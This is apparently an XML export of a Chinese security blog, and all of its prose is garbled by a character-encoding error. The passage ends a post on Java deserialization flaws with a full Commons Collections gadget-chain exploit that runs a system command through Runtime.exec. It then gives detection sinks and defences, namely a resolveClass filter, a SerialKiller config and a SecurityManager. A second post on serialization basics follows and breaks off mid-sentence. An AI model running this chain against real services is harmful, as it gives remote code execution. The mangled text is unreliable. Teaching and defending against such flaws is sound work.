è¿™é‡Œå°†ä¸Šè¿°åˆ†æžçš„è°ƒç”¨è¿‡ç¨‹åšä¸ªå›¾æ¸…æ™°åœ°åˆ—å‡ºæ¥ï¼Œç›¸ä¿¡åº”è¯¥å¾ˆæ˜Žç¡®è¯¥åå°„é“¾æ‰§è¡Œçš„è¿‡ç¨‹äº†ï¼š æœ€ç»ˆæž„é€ çš„ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738public class test &#123; public static void main(String args[]) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); //åˆ©ç”¨åå°„çš„æ–¹å¼æ¥å‘å¯¹è±¡ä¼ å‚ Field valfield = val.getClass().getDeclaredField("val"); valfield.setAccessible(true); valfield.set(val, entry); test t = new test(); t.deserialize(t.serialize(val)); &#125; public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125;&#125; è¿è¡Œç»“æžœï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼š æ£€æµ‹æ–¹æ³•å…¨å±€æœç´¢ObjectInputStreamç±»ï¼Œæ£€æŸ¥æ˜¯å¦è°ƒç”¨readObject()æ–¹æ³•ï¼Œè‹¥å­˜åœ¨è¯¥æ–¹æ³•åˆ™æ£€æŸ¥å…¶æ˜¯å¦è¿›è¡Œäº†é‡å†™ï¼Œè‹¥é‡å†™äº†readObject()æ–¹æ³•åˆ™éœ€ä¸¥æ ¼æŽ’æŸ¥æ˜¯å¦å¯æž„é€ åå°„é“¾æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å½“ç„¶ï¼Œç»“åˆå…¶ä»–å‡ ä¸ªç±»åž‹çš„Javaååºåˆ—æ¼æ´žï¼Œå…¨å±€æœç´¢çš„ç±»æ–¹æ³•å¦‚ä¸‹ï¼š 1234567ObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject é˜²å¾¡æ–¹æ³•1ã€é‡å†™ObjectInputStreamçš„resolveClass()ï¼Œè®¾ç½®é»‘ç™½åå•æœºåˆ¶æœ€å¸¸è§çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨ObjectInputStreamä¸­è®¾ç½®é»‘ç™½åå•æœºåˆ¶çš„æ–¹å¼è¿›è¡Œé˜²å¾¡ã€‚ä¸‹é¢å°±åœ¨Apache Commons Collectionsååºåˆ—åŒ–æ¼æ´žç¤ºä¾‹ä»£ç ä¸­ç›´æŽ¥æ·»åŠ é˜²å¾¡ä»£ç ã€‚ å†™ä¸€ä¸ªSecureObjectInputStreamç±»ï¼Œç»§æ‰¿äºŽObjectInputStreamï¼Œé‡å†™resolveClass()æ–¹æ³•å®žçŽ°é»‘åå•æœºåˆ¶è¿‡æ»¤ï¼š 1234567891011121314151617181920import javax.management.BadAttributeValueExpException;import java.io.*;public class SecureObjectInputStream extends ObjectInputStream &#123; public SecureObjectInputStream(InputStream inputStream) throws IOException &#123; super(inputStream); &#125; /** * Only deserialize instances of our expected Bicycle class */ @Override protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123; if (!desc.getName().equals(BadAttributeValueExpException.class.getName())) &#123; throw new InvalidClassException("è§¦å‘é»‘åå•æœºåˆ¶ï¼Œç¦æ­¢ååºåˆ—åŒ–æ¶æ„ç±»å¯¹è±¡", desc.getName()); &#125; return super.resolveClass(desc); &#125;&#125; æŽ¥ç€åªéœ€åœ¨è°ƒç”¨ä»£ç ä¸­å°†ObjectInputStreamæ›¿æ¢ä¸ºSecureObjectInputStreamæ¥åˆ›å»ºObjectInputStreamå¯¹è±¡ã€‚å†æ¬¡è¿è¡Œæ—¶å‘çŽ°ï¼Œè§¦å‘é»‘åå•æœºåˆ¶ï¼Œæ— æ³•è¿›è¡Œååºåˆ—åŒ–æ¼æ´žçš„åˆ©ç”¨ï¼š 2ã€åˆ©ç”¨SerialKiller.jaråŽŸç†å’Œä¸Šé¢æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å·²ç»æ˜¯æˆç†Ÿçš„è½®å­äº†å¯ä»¥ç›´æŽ¥ä½¿ç”¨ã€‚å…·ä½“çš„å‚è€ƒhttps://github.com/ikkisoft/SerialKiller åˆ›å»ºsk.confé…ç½®æ–‡ä»¶åœ¨æœ¬åœ°é¡¹ç›®æ ¹ç›®å½•ä¸­ï¼Œå…¶ä¸­åªè®¾ç½®äº†é»‘åå•è¿‡æ»¤BadAttributeValueExpExceptionï¼š 1234567891011121314151617&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- serialkiller.conf --&gt;&lt;config&gt; &lt;refresh&gt;6000&lt;/refresh&gt; &lt;mode&gt; &lt;profiling&gt;false&lt;/profiling&gt; &lt;/mode&gt; &lt;logging&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/logging&gt; &lt;blacklist&gt; &lt;regexp&gt;.*BadAttributeValueExpException$&lt;/regexp&gt; &lt;/blacklist&gt; &lt;whitelist&gt; &lt;regexp&gt;.*&lt;/regexp&gt; &lt;/whitelist&gt;&lt;/config&gt; å°†SerialKiller.jaræ·»åŠ è¿›Javaé¡¹ç›®ä¸­ï¼Œå¹¶å°†å…¶æ›¿æ¢æŽ‰ObjectInputStreamæ¥åˆ›å»ºObjectInputStreamå¯¹è±¡ã€‚è¿è¡ŒåŽå‘çŽ°ï¼Œé»‘åå•è¿‡æ»¤äº†BadAttributeValueExpExceptionç±»å¹¶æŠ›å‡ºé”™è¯¯æ— æ³•å¾€ä¸‹æ‰§è¡Œï¼š 3ã€ç¦æ­¢JVMæ‰§è¡Œå¤–éƒ¨å‘½ä»¤Runtime.execé€šè¿‡æ‰©å±•SecurityManagerå¯ä»¥å®žçŽ°ï¼Œè¿™é‡Œæ·»åŠ ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–æ“ä½œä¹‹å‰è°ƒç”¨å³å¯ï¼š 123456789101112131415161718192021222324252627282930313233343536public static void noSerial()&#123; SecurityManager originalSecurityManager = System.getSecurityManager(); if (originalSecurityManager == null) &#123; // åˆ›å»ºè‡ªå·±çš„SecurityManager SecurityManager sm = new SecurityManager() &#123; private void check(Permission perm) &#123; // ç¦æ­¢exec if (perm instanceof java.io.FilePermission) &#123; String actions = perm.getActions(); if (actions != null &amp;&amp; actions.contains("execute")) &#123; throw new SecurityException("execute denied!"); &#125; &#125; // ç¦æ­¢è®¾ç½®æ–°çš„SecurityManagerï¼Œä¿æŠ¤è‡ªå·± if (perm instanceof java.lang.RuntimePermission) &#123; String name = perm.getName(); if (name != null &amp;&amp; name.contains("setSecurityManager")) &#123; throw new SecurityException("System.setSecurityManager denied!"); &#125; &#125; &#125; @Override public void checkPermission(Permission perm) &#123; check(perm); &#125; @Override public void checkPermission(Permission perm, Object context) &#123; check(perm); &#125; &#125;; System.setSecurityManager(sm); &#125;&#125; å°†åˆ›å»ºObjectInputStreamå¯¹è±¡çš„è¯­å¥æ¢å›žåŽŸæ¥çš„ObjectInputStreamç±»ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰è°ƒç”¨å‰é¢å®šä¹‰çš„å‡½æ•°noSerial()ï¼Œè¿è¡Œå‘çŽ°ï¼Œæ— æŠ¥é”™ï¼Œä¹Ÿæ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Œå³é˜²å¾¡æˆåŠŸï¼š å‚è€ƒJavaååºåˆ—åŒ–æ¼æ´žçš„åŽŸç†åˆ†æž Javaååºåˆ—åŒ–æ¼æ´žä»Žå…¥é—¨åˆ°æ·±å…¥ Javaååºåˆ—åŒ–æ¼æ´žåˆ†æž æµ…æžJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ– æ·±å…¥ç†è§£ JAVA ååºåˆ—åŒ–æ¼æ´ž]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶]]></title>
    <url>%2F2019%2F02%2F03%2FJava%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[è¿™é‡Œä¸»è¦è®²è§£Javaåºåˆ—åŒ–åŠååºåˆ—åŒ–æœºåˆ¶ã€‚ ä½•ä¸ºåºåˆ—åŒ–Java æä¾›äº†ä¸€ç§å¯¹è±¡åºåˆ—åŒ–çš„æœºåˆ¶ï¼šä¸€ä¸ªå¯¹è±¡å¯ä»¥è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªå­—èŠ‚åºåˆ—ï¼Œè¯¥å­—èŠ‚åºåˆ—åŒ…æ‹¬è¯¥å¯¹è±¡çš„æ•°æ®ã€æœ‰å…³å¯¹è±¡çš„ç±»åž‹çš„ä¿¡æ¯å’Œå­˜å‚¨åœ¨å¯¹è±¡ä¸­æ•°æ®çš„ç±»åž‹ã€‚å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶ä¹‹åŽï¼Œå¯ä»¥ä»Žæ–‡ä»¶ä¸­è¯»å–å‡ºæ¥ï¼Œå¹¶ä¸”å¯¹å®ƒè¿›è¡Œååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹è±¡çš„ç±»åž‹ä¿¡æ¯ã€å¯¹è±¡çš„æ•°æ®ï¼Œè¿˜æœ‰å¯¹è±¡ä¸­çš„æ•°æ®ç±»åž‹å¯ä»¥ç”¨æ¥åœ¨å†…å­˜ä¸­æ–°å»ºå¯¹è±¡ã€‚æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯JVMç‹¬ç«‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªå¹³å°ä¸Šåºåˆ—åŒ–çš„å¯¹è±¡å¯ä»¥åœ¨å¦ä¸€ä¸ªå®Œå…¨ä¸åŒçš„å¹³å°ä¸Šååºåˆ—åŒ–è¯¥å¯¹è±¡ã€‚ åºåˆ—åŒ–ï¼šæŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ã€‚ ååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ã€‚ ä¸ºä½•è®¾è®¡åºåˆ—åŒ–1ã€å¯ä»¥å¼¥è¡¥ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´çš„å·®å¼‚ï¼Œå¦‚Windowsä¸Šåˆ›å»ºçš„å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–åŽé€šè¿‡ç½‘ç»œä¼ åˆ°Linuxä¸Šå¯ç›´æŽ¥ååºåˆ—åŒ–å¾—åˆ°è¯¥å¯¹è±¡è€Œæ— éœ€æ‹…å¿ƒæ•°æ®åœ¨ä¸åŒæœºå™¨ã€ç³»ç»Ÿä¸Šçš„è¡¨ç¤ºä¼šä¸åŒï¼› 2ã€å¯¹Javaçš„è¿œç¨‹æ–¹æ³•è°ƒç”¨RMIæ˜¯å¿…éœ€çš„ã€‚RMIæ˜¯ä¸ºäº†ä½¿å¾—å­˜åœ¨äºŽå…¶ä»–ä¸»æœºä¸Šçš„å¯¹è±¡ä½¿ç”¨èµ·æ¥åƒæœ¬æœºä¸Šçš„å¯¹è±¡ä¸€æ ·ï¼Œå½“å‘è¿œç¨‹å¯¹è±¡å‘é€ä¿¡æ¯æ—¶ï¼Œéœ€è¦é€šè¿‡å¯¹è±¡åºåˆ—åŒ–æ¥ä¼ è¾“å‚æ•°å’Œè¿”å›žå€¼ï¼› 3ã€å¯¹Java Beanæ˜¯å¿…éœ€çš„ã€‚ä½¿ç”¨ä¸€ä¸ªBeanæ—¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åœ¨è®¾è®¡é˜¶æ®µå¯¹å®ƒçš„çŠ¶æ€ä¿¡æ¯è¿›è¡Œé…ç½®ï¼Œç„¶è€Œè¿™ç§çŠ¶æ€ä¿¡æ¯éœ€è¦ä¿å­˜ä¸‹æ¥ï¼Œå¹¶åœ¨ç¨‹åºå¯åŠ¨æ—¶è¿›è¡ŒåŽæœŸæ¢å¤ï¼Œè¿™æ—¶æ˜¯é ååºåˆ—åŒ–æœºåˆ¶æ¥å®Œæˆçš„ï¼› 4ã€æ–¹ä¾¿ä¿å­˜å¯¹è±¡ä¿¡æ¯ä»¥ä¾¿äºŽä¸‹æ¬¡JVMå¯åŠ¨æ—¶å¯ä»¥ç›´æŽ¥ä½¿ç”¨ã€‚ åºåˆ—åŒ–çš„æ¡ä»¶ä¸€ä¸ªç±»å¯¹è±¡è¦æƒ³å®žçŽ°åºåˆ—åŒ–ï¼Œå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š 1ã€è¯¥ç±»å¿…é¡»å®žçŽ° java.io.Serializable å¯¹è±¡ã€‚ 2ã€è¯¥ç±»çš„æ‰€æœ‰å±žæ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æžœæœ‰ä¸€ä¸ªå±žæ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±žæ€§å¿…é¡»æ³¨æ˜Žæ˜¯çŸ­æš‚çš„ã€‚ å¦‚ä½•åºåˆ—åŒ–è¦åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œé¦–å…ˆè¦åˆ›å»ºOutputStreamå¯¹è±¡ï¼Œå†å°†å…¶å°è£…åœ¨ä¸€ä¸ªObjectOutputStreamå¯¹è±¡å†…ï¼ŒæŽ¥ç€åªéœ€è°ƒç”¨writeObject()å³å¯å°†å¯¹è±¡åºåˆ—åŒ–ï¼Œå¹¶å°†å…¶å‘é€ç»™OutputStreamï¼ˆå¯¹è±¡æ˜¯åŸºäºŽå­—èŠ‚çš„ï¼Œå› æ­¤è¦ä½¿ç”¨InputStreamå’ŒOutputStreamæ¥ç»§æ‰¿å±‚æ¬¡ç»“æž„ï¼‰ã€‚ è¦ååºåˆ—åŒ–å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦å°†ä¸€ä¸ªInputStreamå°è£…åœ¨ObjectInputStreamå†…ï¼Œç„¶åŽè°ƒç”¨readObject()å³å¯ã€‚ ObjectInputStream/ObjectOutputStreamç±» ç±» ObjectInputStream å’Œ ObjectOutputStream æ˜¯é«˜å±‚æ¬¡çš„æ•°æ®æµï¼Œå®ƒä»¬åŒ…å«ååºåˆ—åŒ–å’Œåºåˆ—åŒ–å¯¹è±¡çš„æ–¹æ³•ã€‚ ObjectOutputStream ç±»åŒ…å«å¾ˆå¤šå†™æ–¹æ³•æ¥å†™å„ç§æ•°æ®ç±»åž‹ï¼Œä½†æ˜¯ä¸€ä¸ªç‰¹åˆ«çš„æ–¹æ³•ä¾‹å¤–å³writeObject()ï¼Œå…¶ç”¨æ¥åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å®ƒå‘é€åˆ°è¾“å‡ºæµï¼š 1public final void writeObject(Object x) throws IOException åŒæ ·çš„ï¼ŒObjectInputStreamç±»åŒ…å«ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•readObject()ï¼Œå…¶ç”¨äºŽä»Žæµä¸­å–å‡ºä¸‹ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡ååºåˆ—åŒ–ï¼Œå®ƒçš„è¿”å›žå€¼ä¸ºObjectï¼Œå› æ­¤éœ€è¦å°†å®ƒè½¬æ¢æˆåˆé€‚çš„æ•°æ®ç±»åž‹ï¼š 1public final Object readObject() throws IOException, ClassNotFoundException Demo å®šä¹‰ä¸€ä¸ªUserç±»ï¼Œç»§æ‰¿SerializableæŽ¥å£ï¼Œå…¶ä¸­addresså­—æ®µè®¾ç½®transientå…³é”®å­—ï¼š 1234567891011import java.io.Serializable;public class User implements Serializable &#123; public String name; public transient String address; public int number; public void info()&#123; System.out.println("Name: " + name + "\nAddress: " + address + "\nNumber: " + number); &#125;&#125; ç¼–å†™ä¸€ä¸ªè¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„ç±»ï¼š 123456789101112131415161718192021222324252627import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = "Mi1k7ea"; user.address = "England"; user.number = 666; user.info(); try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]Userå¯¹è±¡å·²ç»åºåˆ—åŒ–ä¿å­˜åˆ°user.seræ–‡ä»¶ä¸­"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; serialize_test(); &#125;&#125; è¿è¡ŒåŽæŸ¥çœ‹è¾“å‡ºï¼Œç»™è¯¥Userå¯¹è±¡èµ‹å€¼æˆåŠŸå¹¶ä¿å­˜åˆ°äº†ç›®æ ‡æ–‡ä»¶ä¸­ï¼š ç”¨WinHexæ‰“å¼€user.seræ–‡ä»¶æŸ¥çœ‹ï¼š åœ¨åˆšåˆšçš„test.classä¸­æ·»åŠ ååºåˆ—åŒ–æ“ä½œçš„å‡½æ•°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = "Mi1k7ea"; user.address = "England"; user.number = 666; user.info(); try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]Userå¯¹è±¡å·²ç»åºåˆ—åŒ–ä¿å­˜åˆ°user.seræ–‡ä»¶ä¸­"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream("user.ser"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println("[*]ååºåˆ—åŒ–åŽçš„å†…å®¹ï¼š"); user.info(); &#125; public static void main(String[] args) &#123;// serialize_test(); unserialize_test(); &#125;&#125; æ³¨æ„ï¼ŒreadObject()æ–¹æ³•ä¸­çš„try/catchä»£ç å—å°è¯•æ•èŽ· ClassNotFoundException å¼‚å¸¸ã€‚å¯¹äºŽJVMå¯ä»¥ååºåˆ—åŒ–å¯¹è±¡ï¼Œå®ƒå¿…é¡»æ˜¯èƒ½å¤Ÿæ‰¾åˆ°å­—èŠ‚ç çš„ç±»ã€‚å¦‚æžœJVMåœ¨ååºåˆ—åŒ–å¯¹è±¡çš„è¿‡ç¨‹ä¸­æ‰¾ä¸åˆ°è¯¥ç±»ï¼Œåˆ™æŠ›å‡ºä¸€ä¸ªClassNotFoundExceptionå¼‚å¸¸ã€‚ æŸ¥çœ‹ååºåˆ—åŒ–ç»“æžœï¼š å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œé™¤äº†Addresså±žæ€§å¤–å…¶ä½™çš„å±žæ€§å€¼éƒ½æˆåŠŸåœ°ååºåˆ—åŒ–å‡ºæ¥äº†å¾—åˆ°å‡ ä¹Žå’Œåºåˆ—åŒ–ä¹‹å‰ä¸€æ ·çš„å¯¹è±¡ã€‚è¿™é‡ŒAddresså±žæ€§æ˜¯å› ä¸ºè®¾ç½®äº†transientå…³é”®å­—ï¼Œå…·ä½“çš„åŽŸç†åœ¨ä¸‹é¢ä¼šè®²è§£ã€‚ serialVersionUIDserialVersionUIDå³åºåˆ—åŒ–çš„ç‰ˆæœ¬å·ï¼Œé€‚ç”¨äºŽJavaçš„åºåˆ—åŒ–æœºåˆ¶ã€‚ç®€å•æ¥è¯´ï¼ŒJavaçš„åºåˆ—åŒ–æœºåˆ¶æ˜¯é€šè¿‡åˆ¤æ–­ç±»çš„serialVersionUIDæ¥éªŒè¯ç‰ˆæœ¬ä¸€è‡´æ€§çš„ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJVMä¼šæŠŠä¼ æ¥çš„å­—èŠ‚æµä¸­çš„serialVersionUIDä¸Žæœ¬åœ°ç›¸åº”å®žä½“ç±»çš„serialVersionUIDè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœç›¸åŒå°±è®¤ä¸ºæ˜¯ä¸€è‡´çš„ï¼Œå¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦åˆ™å°±ä¼šå‡ºçŽ°åºåˆ—åŒ–ç‰ˆæœ¬ä¸ä¸€è‡´çš„å¼‚å¸¸ï¼Œå³æ˜¯InvalidCastExceptionã€‚ å…·ä½“çš„åºåˆ—åŒ–è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼šåºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ç³»ç»Ÿä¼šæŠŠå½“å‰ç±»çš„serialVersionUIDå†™å…¥åˆ°åºåˆ—åŒ–æ–‡ä»¶ä¸­ï¼Œå½“ååºåˆ—åŒ–æ—¶ç³»ç»Ÿä¼šåŽ»æ£€æµ‹æ–‡ä»¶ä¸­çš„serialVersionUIDï¼Œåˆ¤æ–­å®ƒæ˜¯å¦ä¸Žå½“å‰ç±»çš„serialVersionUIDä¸€è‡´ï¼Œå¦‚æžœä¸€è‡´å°±è¯´æ˜Žåºåˆ—åŒ–ç±»çš„ç‰ˆæœ¬ä¸Žå½“å‰ç±»ç‰ˆæœ¬æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥ååºåˆ—åŒ–æˆåŠŸï¼Œå¦åˆ™å¤±è´¥ã€‚ serialVersionUIDæœ‰ä¸¤ç§æ˜¾ç¤ºçš„ç”Ÿæˆæ–¹å¼ï¼š ä¸€æ˜¯é»˜è®¤çš„1Lï¼Œæ¯”å¦‚ï¼šprivate static final long serialVersionUID = 1Lï¼› äºŒæ˜¯æ ¹æ®ç±»åã€æŽ¥å£åã€æˆå‘˜æ–¹æ³•åŠå±žæ€§ç­‰æ¥ç”Ÿæˆä¸€ä¸ª64ä½çš„å“ˆå¸Œå­—æ®µï¼Œæ¯”å¦‚ï¼š 1private static final long serialVersionUID = xxxxL; å½“ä¸€ä¸ªç±»å®žçŽ°äº†SerializableæŽ¥å£ï¼Œå¦‚æžœæ²¡æœ‰æ˜¾ç¤ºçš„å®šä¹‰serialVersionUIDï¼ŒEclipseä¼šæä¾›ç›¸åº”çš„æé†’ã€‚é¢å¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨Eclipseä¸­ç‚¹å‡»ç±»ä¸­warningå›¾æ ‡ä¸€ä¸‹ï¼ŒEclipseå°±ä¼šè‡ªåŠ¨ç»™å®šä¸¤ç§ç”Ÿæˆçš„æ–¹å¼ã€‚å¦‚æžœä¸æƒ³å®šä¹‰ï¼Œåœ¨Eclipseçš„è®¾ç½®ä¸­ä¹Ÿå¯ä»¥æŠŠå®ƒå…³æŽ‰çš„ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š Window ==&gt; Preferences ==&gt; Java ==&gt; Compiler ==&gt; Error/Warnings ==&gt; Potential programming problemså°†Serializable class without serialVersionUIDçš„warningæ”¹æˆignoreå³å¯ã€‚ å½“å®žçŽ°java.io.SerializableæŽ¥å£çš„ç±»æ²¡æœ‰æ˜¾å¼åœ°å®šä¹‰ä¸€ä¸ªserialVersionUIDå˜é‡æ—¶å€™ï¼ŒJavaåºåˆ—åŒ–æœºåˆ¶ä¼šæ ¹æ®ç¼–è¯‘çš„Classè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªserialVersionUIDä½œåºåˆ—åŒ–ç‰ˆæœ¬æ¯”è¾ƒç”¨ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æžœClassæ–‡ä»¶(ç±»åï¼Œæ–¹æ³•æ˜Žç­‰)æ²¡æœ‰å‘ç”Ÿå˜åŒ–(å¢žåŠ ç©ºæ ¼ï¼Œæ¢è¡Œï¼Œå¢žåŠ æ³¨é‡Šç­‰ç­‰)ï¼Œå°±ç®—å†ç¼–è¯‘å¤šæ¬¡ï¼ŒserialVersionUIDä¹Ÿä¸ä¼šå˜åŒ–çš„ã€‚ æ˜¾å¼åœ°å®šä¹‰serialVersionUIDæœ‰ä¸¤ç§ç”¨é€”ï¼š 1ã€ åœ¨æŸäº›åœºåˆï¼Œå¸Œæœ›ç±»çš„ä¸åŒç‰ˆæœ¬å¯¹åºåˆ—åŒ–å…¼å®¹ï¼Œå› æ­¤éœ€è¦ç¡®ä¿ç±»çš„ä¸åŒç‰ˆæœ¬å…·æœ‰ç›¸åŒçš„serialVersionUIDï¼› 2ã€ åœ¨æŸäº›åœºåˆï¼Œä¸å¸Œæœ›ç±»çš„ä¸åŒç‰ˆæœ¬å¯¹åºåˆ—åŒ–å…¼å®¹ï¼Œå› æ­¤éœ€è¦ç¡®ä¿ç±»çš„ä¸åŒç‰ˆæœ¬å…·æœ‰ä¸åŒçš„serialVersionUIDã€‚ åºåˆ—åŒ–çš„æŽ§åˆ¶åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¯¹åºåˆ—åŒ–çš„è¿‡ç¨‹è¿›è¡ŒæŽ§åˆ¶ï¼Œæ¯”å¦‚è¯´ä¸éœ€è¦å“ªäº›éƒ¨åˆ†è¢«ååºåˆ—åŒ–ç­‰ï¼Œè¿™æ—¶å¯é€šè¿‡ExternalizableæŽ¥å£æ›¿ä»£SerializableæŽ¥å£æ¥å®žçŽ°å¯¹åºåˆ—åŒ–è¿‡ç¨‹çš„æŽ§åˆ¶ã€‚ 1ã€Externalizable ExternalizableæŽ¥å£ç»§æ‰¿äº†SerializableæŽ¥å£ï¼ŒåŒæ—¶æ·»åŠ äº†ä¸¤ä¸ªæ–¹æ³•å³writeExternal()å’ŒreadExternal()ï¼Œä¸¤è€…ä¼šåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œä»¥ä¾¿äºŽæ‰§è¡Œä¸€äº›ç‰¹æ®Šæ“ä½œæ¥å®žçŽ°è¿‡ç¨‹æŽ§åˆ¶ã€‚ 2ã€transientå…³é”®å­— å½“æˆ‘ä»¬å¯¹åºåˆ—åŒ–è¿›è¡ŒæŽ§åˆ¶æ—¶ï¼Œå¯èƒ½æœ‰äº›ç‰¹æ®Šå­å¯¹è±¡ä¸æƒ³è®©Javaçš„åºåˆ—åŒ–æœºåˆ¶è‡ªåŠ¨ä¿å­˜å’Œæ¢å¤ï¼Œæ¯”å¦‚è¯´å­å¯¹è±¡è¡¨ç¤ºçš„æ˜¯æ•æ„Ÿä¿¡æ¯ã€‚å³ä½¿å¯¹è±¡ä¸­çš„è¿™äº›ä¿¡æ¯æ˜¯privateå±žæ€§ï¼Œä½†ç»è¿‡åºåˆ—åŒ–å¤„ç†åŽäººä»¬å°±å¯ä»¥é€šè¿‡è¯»å–æ–‡ä»¶æˆ–æ‹¦æˆªæ•°æ®æŠ¥æ–‡æ¥éžæ³•èŽ·å–è¯¥ä¿¡æ¯ã€‚ è¿™æ—¶å­˜åœ¨ä¸¤ä¸ªæ–¹æ³•ã€‚ä¸€æ˜¯é€šè¿‡å°†ç±»å®žçŽ°ä¸ºå‰é¢çš„Externalizableï¼Œè¿™æ—¶æ— 